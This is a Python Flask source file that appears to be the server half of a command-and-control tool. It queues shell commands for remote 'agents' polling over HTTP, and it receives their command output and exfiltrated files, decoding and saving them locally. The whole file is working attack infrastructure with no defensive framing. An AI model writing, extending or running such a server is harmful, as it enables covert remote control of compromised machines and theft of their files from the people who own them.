from flask import Flask, request, jsonify, make_response
import socket
import os
import base64
import json



SERVER_HOSTNAME = socket.gethostname()
SERVER_IP = socket.gethostbyname(SERVER_HOSTNAME)
PID = str(os.getpid())

print("HTTP Server started on: " + SERVER_HOSTNAME + " with IP: " + SERVER_IP + "\nPID: " + PID)
app = Flask(__name__)


@app.route('/check_for_command', methods=['POST'])
def check_for_command():
    if request.method == 'POST':
        client_ip = request.remote_addr
        print "'/check_for_command' -  incoming request from IP: " + client_ip
        content = request.get_json(silent=True, force=True)
        machine_info = ""
        try:
            machine_info = content["machine_info"]
        except Exception, e:
            pass
        if machine_info:
            print "Machine information: " + machine_info

        json_obj = {}
        try:
            with open("input.json", "r") as file:
                try:
                    json_obj = json.load(file)
                except Exception, e:
                    print "input.json isn't in a current json format\n"
        except Exception, e:
            print "input.json file wasn't found\n"
            return send_http_response("0", "", "")

        if "command" in json_obj and "extra_data" in json_obj:
            try:
                #deleting old command from the queue
                os.remove("input.json")
            except Exception, e:
                print "Couldn't delete previous input.json file"
            return send_http_response("1", json_obj["command"], json_obj["extra_data"])
        print "command or extra_data parameters weren't found in input.json"
        return send_http_response("0", "", "")


@app.route('/process_command', methods=['POST'])
def process_command():
    if request.method == 'POST':
        client_ip = request.remote_addr
        print("'/process_command' -  incoming request from IP: " + client_ip)
        content = request.get_json(silent=True, force=True)
        try:
            status = content["status"]
            extra_data = content["extra_data"]
        except Exception, e:
            print("Error gathering values from client. Error was: " + str(e))
            return send_http_response("3", "", "")

        if status == "0":
            print "ERROR:"
            print extra_data
        elif status == "1":
            print "File Download:"
            print extra_data
        elif status == "2":
            print "File Upload:"
            file_name = extra_data["file_name"]
            buf = extra_data["buf"]
            with open("downloads_from_agent" + os.sep + file_name, "wb") as file:
                file.write(base64.b64decode(buf))
            print "File saved to " + "downloads_from_agent" + os.sep + file_name
        elif status == "3":
            print "CMD:"
            try:
                with open("downloads_from_agent" + os.sep + "cmd_out", "w") as file:
                    file.write(extra_data)
                print "CMD output saved to downloads_from_agent" + os.sep + "cmd_out file"
            except Exception, e:
                print "Exception while writing cmd_out: " + str(e)
        else:
            print "Status code returned from agent not recognized"
        return send_http_response("1", "", "")


def send_http_response(status, command, extra_data):
    response = make_response(jsonify(status=status, command=command, extra_data=extra_data))
    return response


def create_downloads_dir():
    if not os.path.exists("downloads_from_agent"):
        try:
            os.mkdir("downloads_from_agent")
        except Exception, e:
            print "Error: Couldn't create downloads_from_agent directory " + str(e)
            print "Exiting"
            exit(-1)


if __name__ == '__main__':
    create_downloads_dir()
    app.run(host="0.0.0.0", port=80)



